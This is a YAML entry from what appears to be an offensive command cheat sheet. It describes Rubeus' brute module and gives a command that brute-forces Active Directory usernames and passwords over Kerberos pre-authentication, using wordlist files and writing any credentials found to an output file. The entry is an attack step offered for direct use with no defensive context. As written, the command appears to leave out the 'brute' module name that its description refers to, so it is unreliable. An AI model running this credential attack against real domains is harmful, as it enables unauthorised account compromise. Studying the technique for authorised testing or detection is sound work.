---
description: |
  Rubeus' `brute` module bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to brute force valid username and passwords logins given a list of usernames and a list of passwords.

  Command Reference:

  	Domain: test.local

  	Username List: usernames.txt

  	Password List: passwords.txt

  	Output File: found_passwords.txt
command: |
  Rubeus.exe /users:usernames.txt /passwords:passwords.txt /domain:test.local /outfile:found_passwords.txt
items:
  - No_Creds
services:
  - Kerberos
OS:
  - Windows
attack_types:
  - Enumeration
references:
  - https://github.com/GhostPack/Rubeus
  - https://github.com/GhostPack/Rubeus#brute
---
